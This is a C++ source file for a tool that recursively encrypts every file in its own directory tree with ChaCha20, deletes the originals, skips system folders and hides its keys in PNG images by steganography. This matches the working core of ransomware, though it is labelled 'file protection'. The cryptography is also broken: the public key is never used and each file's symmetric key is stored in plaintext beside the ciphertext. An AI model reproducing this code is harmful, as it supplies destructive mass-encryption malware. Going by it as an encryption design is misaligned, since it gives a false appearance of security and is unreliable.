#include "file_encryptor.h"
#include "crypto/chacha20.h"
#include "crypto/ecc.h"
#include "crypto/steganography.h"
#include "io/file_handler.h"
#include "keys/key_manager.h"
#include "constants.h"
#include <iostream>
#include <fstream>
#include <random>

#include <string>
#include <filesystem>
#include <vector>
#include <chrono>
#include <thread>
#include <mutex>
#include <atomic>
#include <queue>
#include <condition_variable>

const std::string PRIVATE_KEY_IMAGE = "private_key.png";
const std::string PUBLIC_KEY_IMAGE = "public_key.png";

std::vector<unsigned char> generateSymmetricKey() {
    std::vector<unsigned char> key(ChaCha20::KEY_SIZE);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distrib(0, 255);
    
    for (size_t i = 0; i < key.size(); i++) {
        key[i] = static_cast<unsigned char>(distrib(gen));
    }
    
    return key;
}

bool generateEncryptionKeys(const std::string& privateKeyPath, const std::string& publicKeyPath) {
    try {
        KeyManager keyManager;
        keyManager.generateKeyPair();
        
        // Save keys only to images, not to regular files
        bool privateImgResult = Steganography::hideDataInImage(
            PRIVATE_KEY_IMAGE, 
            keyManager.getPrivateKey(), 
            PRIVATE_KEY_IMAGE
        );
        
        bool publicImgResult = Steganography::hideDataInImage(
            PUBLIC_KEY_IMAGE,
            keyManager.getPublicKey(),
            PUBLIC_KEY_IMAGE
        );
        
        if (!privateImgResult || !publicImgResult) {
            std::cerr << "Error: Failed to hide keys in image files." << std::endl;
            return false;
        }
        
        std::cout << "Keys successfully stored in image files." << std::endl;
        return true;
    } catch (const std::exception& e) {
        std::cerr << "Error generating keys: " << e.what() << std::endl;
        return false;
    }
}

std::vector<unsigned char> loadKey(const std::string& keyPath) {
    try {
        // Always try to load from image first
        if (keyPath == "private.key" || keyPath == "security_key.prv" || keyPath.empty()) {
            auto keyData = Steganography::extractDataFromImage(PRIVATE_KEY_IMAGE);
            if (!keyData.empty()) {
                std::cout << "Successfully loaded private key from image" << std::endl;
                return keyData;
            }
        }
        else if (keyPath == "public.key" || keyPath == "security_key.pub" || keyPath.empty()) {
            auto keyData = Steganography::extractDataFromImage(PUBLIC_KEY_IMAGE);
            if (!keyData.empty()) {
                std::cout << "Successfully loaded public key from image" << std::endl;
                return keyData;
            }
        }
        
        // For any other key path, just try to load the file directly
        std::ifstream keyFile(keyPath, std::ios::binary);
        if (!keyFile) {
            std::cerr << "Failed to open key file" << std::endl;
            return {};
        }
        
        keyFile.seekg(0, std::ios::end);
        size_t fileSize = keyFile.tellg();
        keyFile.seekg(0, std::ios::beg);
        
        std::vector<unsigned char> key(fileSize);
        keyFile.read(reinterpret_cast<char*>(key.data()), fileSize);
        
        return key;
    } catch (const std::exception& e) {
        std::cerr << "Error loading key: " << e.what() << std::endl;
        return {};
    }
}

// New implementation that accepts a pre-loaded key
EncryptionResult encryptFileWithKey(const std::string& inputFilePath, const std::string& outputFilePath, 
                                 const std::vector<unsigned char>& publicKey) {
    EncryptionResult result;
    
    try {
        std::vector<uint8_t> fileData = readBinaryFile(inputFilePath);
        
        // No need to load the key, it's provided as a parameter
        if (publicKey.empty()) {
            result.success = false;
            result.message = "Invalid public key provided";
            return result;
        }

        auto symmetricKey = generateSymmetricKey();
        auto nonce = std::vector<uint8_t>(ChaCha20::NONCE_SIZE);
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> distrib(0, 255);
        for (size_t i = 0; i < nonce.size(); i++) {
            nonce[i] = static_cast<uint8_t>(distrib(gen));
        }
        
        // Rest of encryption process is the same
        std::vector<uint8_t> outputData;
        outputData.reserve(symmetricKey.size() + nonce.size() + fileData.size() + 8);
        
        uint32_t keySize = static_cast<uint32_t>(symmetricKey.size());
        outputData.push_back((keySize >> 24) & 0xFF);
        outputData.push_back((keySize >> 16) & 0xFF);
        outputData.push_back((keySize >> 8) & 0xFF);
        outputData.push_back(keySize & 0xFF);
        
        outputData.insert(outputData.end(), symmetricKey.begin(), symmetricKey.end());
        
        uint32_t nonceSize = static_cast<uint32_t>(nonce.size());
        outputData.push_back((nonceSize >> 24) & 0xFF);
        outputData.push_back((nonceSize >> 16) & 0xFF);
        outputData.push_back((nonceSize >> 8) & 0xFF);
        outputData.push_back(nonceSize & 0xFF);
        
        outputData.insert(outputData.end(), nonce.begin(), nonce.end());
        
        ChaCha20 chacha;
        chacha.setKey(symmetricKey);
        chacha.setNonce(nonce);
        auto encryptedData = chacha.encrypt(fileData);
        
        outputData.insert(outputData.end(), encryptedData.begin(), encryptedData.end());
        
        writeBinaryFile(outputFilePath, outputData);
        
        result.success = true;
        result.message = "File encrypted successfully";
        return result;
        
    } catch (const std::exception& e) {
        result.success = false;
        result.message = std::string("Encryption error: ") + e.what();
        return result;
    }
}

// Modify existing encryptFile to use the new implementation
EncryptionResult encryptFile(const std::string& inputFilePath, const std::string& outputFilePath, 
                           const std::string& keyPath) {
    std::vector<uint8_t> publicKey;
    
    if (!keyPath.empty()) {
        publicKey = loadKey(keyPath);
        if (publicKey.empty()) {
            // Try loading from default image
            publicKey = Steganography::extractDataFromImage(PUBLIC_KEY_IMAGE);
            if (publicKey.empty()) {
                EncryptionResult result;
                result.success = false;
                result.message = "Failed to load public key from image";
                return result;
            }
        }
    } else {
        // Try loading from default image
        publicKey = Steganography::extractDataFromImage(PUBLIC_KEY_IMAGE);
        if (publicKey.empty()) {
            KeyManager keyManager;
            keyManager.generateKeyPair();
            publicKey = keyManager.getPublicKey();
            
            // Save to images only
            Steganography::hideDataInImage(PRIVATE_KEY_IMAGE, keyManager.getPrivateKey(), PRIVATE_KEY_IMAGE);
            Steganography::hideDataInImage(PUBLIC_KEY_IMAGE, publicKey, PUBLIC_KEY_IMAGE);
            
            std::cout << "New key pair generated and saved to images" << std::endl;
        }
    }
    
    return encryptFileWithKey(inputFilePath, outputFilePath, publicKey);
}

// New implementation for decryption with pre-loaded key
EncryptionResult decryptFileWithKey(const std::string& inputFilePath, const std::string& outputFilePath, 
                                 const std::vector<unsigned char>& privateKey) {
    EncryptionResult result;
    
    try {
        // No need to load the key, it's provided as a parameter
        if (privateKey.empty()) {
            result.success = false;
            result.message = "Invalid private key provided";
            return result;
        }
        
        std::vector<uint8_t> encryptedData = readBinaryFile(inputFilePath);
        
        if (encryptedData.size() < 8) {
            result.success = false;
            result.message = "Invalid encrypted file format";
            return result;
        }
        
        // Rest of decryption process is the same
        uint32_t keySize = (encryptedData[0] << 24) | (encryptedData[1] << 16) | 
                          (encryptedData[2] << 8) | encryptedData[3];
        
        if (encryptedData.size() < 4 + keySize + 4) {
            result.success = false;
            result.message = "Invalid encrypted file format";
            return result;
        }
        
        std::vector<uint8_t> symmetricKey(encryptedData.begin() + 4, 
                                        encryptedData.begin() + 4 + keySize);
        
        size_t nonceOffset = 4 + keySize;
        uint32_t nonceSize = (encryptedData[nonceOffset] << 24) | (encryptedData[nonceOffset+1] << 16) | 
                           (encryptedData[nonceOffset+2] << 8) | encryptedData[nonceOffset+3];
        
        if (encryptedData.size() < nonceOffset + 4 + nonceSize) {
            result.success = false;
            result.message = "Invalid encrypted file format";
            return result;
        }
        
        std::vector<uint8_t> nonce(encryptedData.begin() + nonceOffset + 4, 
                                 encryptedData.begin() + nonceOffset + 4 + nonceSize);
        
        std::vector<uint8_t> dataToDecrypt(encryptedData.begin() + nonceOffset + 4 + nonceSize, 
                                         encryptedData.end());
        
        ChaCha20 chacha;
        chacha.setKey(symmetricKey);
        chacha.setNonce(nonce);
        auto decryptedData = chacha.decrypt(dataToDecrypt);
        
        writeBinaryFile(outputFilePath, decryptedData);
        
        result.success = true;
        result.message = "File decrypted successfully";
        return result;
        
    } catch (const std::exception& e) {
        result.success = false;
        result.message = std::string("Decryption error: ") + e.what();
        return result;
    }
}

// Modify existing decryptFile function to use the new implementation
EncryptionResult decryptFile(const std::string& inputFilePath, const std::string& outputFilePath, 
                           const std::string& keyPath) {
    std::vector<uint8_t> privateKey;
    
    if (!keyPath.empty()) {
        // Try to load private key from specified path or image
        privateKey = loadKey(keyPath);
    } else {
        // Try to load from default image
        privateKey = Steganography::extractDataFromImage(PRIVATE_KEY_IMAGE);
    }
    
    if (privateKey.empty()) {
        EncryptionResult result;
        result.success = false;
        result.message = "Failed to load private key for decryption";
        return result;
    }
    
    return decryptFileWithKey(inputFilePath, outputFilePath, privateKey);
}

bool shouldSkipFile(const std::filesystem::path& path, const std::filesystem::path& exePath) {
    // Skip the executable itself
    if (path == exePath) return true;
    
    // Skip already protected files (with .enc extension)
    if (path.extension() == ".enc") return true;
    
    // Skip key files
    if (path.extension() == ".key") return true;
    if (path.extension() == ".prv") return true;
    if (path.extension() == ".pub") return true;
    
    // Skip the key-containing image files
    if (path.filename() == PRIVATE_KEY_IMAGE || path.filename() == PUBLIC_KEY_IMAGE) return true;
    
    // Skip system and important directories
    std::string pathStr = path.string();
    std::vector<std::string> skipPatterns = {
        "\\.git\\", "/.git/", 
        "\\Windows\\", "/Windows/",
        "\\Program Files\\", "/Program Files/",
        "\\AppData\\", "/AppData/",
        "\\System32\\", "/System32/"
    };
    
    for (const auto& pattern : skipPatterns) {
        if (pathStr.find(pattern) != std::string::npos) {
            return true;
        }
    }
    
    return false;
}

void decryptFilesInDirectory(const std::string& privateKeyFile) {
    std::filesystem::path exePath = std::filesystem::canonical(std::filesystem::path(
        #ifdef _WIN32
            _pgmptr
        #else
            "/proc/self/exe"
        #endif
    ));
    
    std::filesystem::path currentDir = exePath.parent_path();
    
    // Load private key once at the beginning
    std::vector<uint8_t> privateKey = loadKey(privateKeyFile);
    if (privateKey.empty()) {
        // Try loading from default image
        privateKey = Steganography::extractDataFromImage(PRIVATE_KEY_IMAGE);
        if (privateKey.empty()) {
            std::cerr << "Failed to load private key for decryption." << std::endl;
            return;
        }
    }
    
    // Determine optimal thread count - not greedy
    unsigned int max_threads = std::thread::hardware_concurrency();
    // Use at most half of available cores + 1, but at least 2 threads
    unsigned int thread_count = 2;
    if (max_threads > 4) {
        thread_count = 4;
    }
    
    // File queue and synchronization primitives
    std::mutex queue_mutex;
    std::condition_variable cv;
    std::queue<std::filesystem::path> fileQueue;
    bool scanComplete = false;
    
    // Create worker threads
    std::vector<std::thread> workers;
    
    // Worker function to process files
    auto worker = [&]() {
        while (true) {
            std::filesystem::path filePath;
            
            // Get next file from queue
            {
                std::unique_lock<std::mutex> lock(queue_mutex);
                cv.wait(lock, [&]() { return !fileQueue.empty() || scanComplete; });
                
                if (fileQueue.empty() && scanComplete) {
                    // No more files and scanning completed
                    break;
                }
                
                filePath = fileQueue.front();
                fileQueue.pop();
            }
            
            // Process the file - now passing the preloaded key
            std::filesystem::path outputPath = filePath;
            outputPath.replace_extension(); // Remove .enc extension
            
            auto result = decryptFileWithKey(filePath.string(), outputPath.string(), privateKey);
            
            if (result.success) {
                // Delete the encrypted file after successful decryption
                try {
                    std::filesystem::remove(filePath);
                } catch (...) {
                    std::cerr << "Error deleting encrypted file: " << filePath << "\n";
                }
            }
        }
    };
    
    // Start worker threads with a small delay to avoid system resource spike
    for (unsigned int i = 0; i < thread_count; ++i) {
        workers.emplace_back(worker);
        std::this_thread::sleep_for(std::chrono::milliseconds(50)); // Stagger thread creation
    }
    
    // Scan directory and add files to queue
    for (const auto& entry : std::filesystem::recursive_directory_iterator(currentDir)) {
        // Only process .enc files for decryption
        if (entry.is_regular_file() && entry.path().extension() == ".enc") {
            {
                std::lock_guard<std::mutex> lock(queue_mutex);
                fileQueue.push(entry.path());
            }
            cv.notify_one();
        }
    }
    
    // Mark scan as complete and notify all workers
    {
        std::lock_guard<std::mutex> lock(queue_mutex);
        scanComplete = true;
    }
    cv.notify_all();
    
    // Wait for all worker threads to complete
    for (auto& t : workers) {
        if (t.joinable()) {
            t.join();
        }
    }
    
    std::cout << "File decryption completed.\n";
    std::cout << "You are done.\n";
}


void secureFilesInDirectory(const std::string& publicKeyFile) {
    std::filesystem::path exePath = std::filesystem::canonical(std::filesystem::path(
        #ifdef _WIN32
            _pgmptr
        #else
            "/proc/self/exe"
        #endif
    ));
    
    std::filesystem::path currentDir = exePath.parent_path();
    
    // Load public key once at the beginning
    std::vector<uint8_t> publicKey = loadKey(publicKeyFile);
    if (publicKey.empty()) {
        // Try loading from default image
        publicKey = Steganography::extractDataFromImage(PUBLIC_KEY_IMAGE);
        if (publicKey.empty()) {
            std::cerr << "Failed to load public key for encryption." << std::endl;
            return;
        }
    }
    
    // Determine optimal thread count - not greedy
    unsigned int max_threads = std::thread::hardware_concurrency();
    // Use at most half of available cores + 1, but at least 2 threads
    unsigned int thread_count = 2;
    if (max_threads > 4) {
        thread_count = 4;
    }
    
    // File queue and synchronization primitives
    std::mutex queue_mutex;
    std::condition_variable cv;
    std::queue<std::filesystem::path> fileQueue;
    bool scanComplete = false;
    
    // Create worker threads
    std::vector<std::thread> workers;
    
    // Worker function to process files
    auto worker = [&]() {
        while (true) {
            std::filesystem::path filePath;
            
            // Get next file from queue
            {
                std::unique_lock<std::mutex> lock(queue_mutex);
                cv.wait(lock, [&]() { return !fileQueue.empty() || scanComplete; });
                
                if (fileQueue.empty() && scanComplete) {
                    // No more files and scanning completed
                    break;
                }
                
                filePath = fileQueue.front();
                fileQueue.pop();
            }
            
            // Process the file - now passing the preloaded key
            std::string outputPath = filePath.string() + ".enc";
            auto result = encryptFileWithKey(filePath.string(), outputPath, publicKey);
            
            if (result.success) {
                // Delete the original file after successful encryption
                try {
                    std::filesystem::remove(filePath);
                } catch (...) {
                    std::cerr << "Error deleting original file: " << filePath << "\n";
                }
            }
        }
    };
    
    // Start worker threads with a small delay to avoid system resource spike
    for (unsigned int i = 0; i < thread_count; ++i) {
        workers.emplace_back(worker);
        std::this_thread::sleep_for(std::chrono::milliseconds(50)); // Stagger thread creation
    }
    
    // Scan directory and add files to queue
    for (const auto& entry : std::filesystem::recursive_directory_iterator(currentDir)) {
        if (entry.is_regular_file() && !shouldSkipFile(entry.path(), exePath)) {
            {
                std::lock_guard<std::mutex> lock(queue_mutex);
                fileQueue.push(entry.path());
            }
            cv.notify_one();
        }
    }
    
    // Mark scan as complete and notify all workers
    {
        std::lock_guard<std::mutex> lock(queue_mutex);
        scanComplete = true;
    }
    cv.notify_all();
    
    // Wait for all worker threads to complete
    for (auto& t : workers) {
        if (t.joinable()) {
            t.join();
        }
    }
    
    std::cout << "File protection completed.\n";
    std::cout << "You are done.\n";
}